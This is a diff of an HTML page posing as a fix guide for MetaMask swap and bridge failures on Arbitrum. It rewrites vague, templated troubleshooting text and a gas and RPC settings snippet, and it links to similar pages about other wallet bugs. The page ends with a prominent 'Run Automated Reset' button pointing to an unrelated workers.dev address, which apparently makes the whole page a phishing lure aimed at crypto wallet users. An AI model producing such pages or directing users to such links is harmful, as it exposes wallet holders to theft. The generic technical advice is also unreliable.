@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Bug Swap And Bridge Fail On Arbitrum Network – Fix Guide</title>
 <style>
     body {
-        font-family: BlinkMacSystemFont;
-        background: #1a1a24;
+        font-family: sans-serif;
+        background: #0a0c10;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+        box-shadow: none;
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #cf6679; }
+    a { color: #ff9455; }
     .btn {
-        background: #ff7b2c;
+        background: #cf6679;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,36 +42,33 @@
 <h1>Metamask Extension Bug Swap And Bridge Fail On Arbitrum Network</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter a failure when attempting to swap or bridge assets on the Arbitrum network through the Metamask extension, resulting in an error message indicating the transaction cannot be completed.</li>
+<li>Users experience a failure when attempting to swap or bridge assets on the Arbitrum network using the Metamask extension, resulting in an error message indicating the transaction cannot be completed.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a compatibility issue between the Metamask extension and the Arbitrum network, potentially caused by outdated extension versions, incorrect network configuration, or insufficient gas limits.</li>
+<li>The error occurs due to a compatibility issue between the Metamask extension and the Arbitrum network, specifically related to the handling of gas prices and transaction sequencing.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Update Metamask extension to the latest version</li>
-<li>Configure the Arbitrum network manually with the correct RPC and chain ID</li>
-<li>Increase the gas limit for transactions on the Arbitrum network</li>
+<li>To resolve the issue, users can try the following manual overrides:</li>
+<li>Increase the gas limit and gas price for the transaction</li>
+<li>Use a different RPC endpoint for the Arbitrum network</li>
+<li>Update the Metamask extension to the latest version and restart the browser</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;rpc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;https://arbitrum-mainnet.infura.io/v3/YOUR_PROJECT_ID&quot;</span><span class="p">,</span>
 <span class="w">  </span><span class="nt">&quot;chainId&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">42161</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;chainName&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Arbitrum&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;rpcUrls&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;https://arb1.arbitrum.io/rpc&quot;</span><span class="p">],</span>
-<span class="w">  </span><span class="nt">&quot;nativeCurrency&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Ether&quot;</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">&quot;symbol&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;ETH&quot;</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">&quot;decimals&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">18</span>
-<span class="w">  </span><span class="p">}</span>
+<span class="w">  </span><span class="nt">&quot;gas&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2000000&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;gasPrice&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;20000000000&quot;</span>
 <span class="p">}</span>
 </code></pre></div>
 
 <p>Prerequisites:
-* Metamask extension installed
-* Arbitrum network configuration knowledge
-* Basic understanding of Ethereum transaction settings
-For further debugging, consider utilizing an external console to execute low-level commands.</p>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li><li><a href="./archive/2026/06/metamask-extension-bug-sign-message-clicking-back-button-in-the.html">Metamask Extension Bug Sign Message Clicking Back Button In The</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li></ul>
+- Metamask extension installed and configured
+- Arbitrum network added to the Metamask extension
+- Sufficient ETH balance for transaction fees
+For further debugging, consider utilizing an external console to inspect the transaction details and identify potential issues.</p>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-assets-miss-match-between-network-picker.html">Metamask Extension Bug Assets Miss Match Between Network Picker</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-native-assets-for-custom-networks.html">Metamask Extension Bug Assets Native Assets For Custom Networks</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
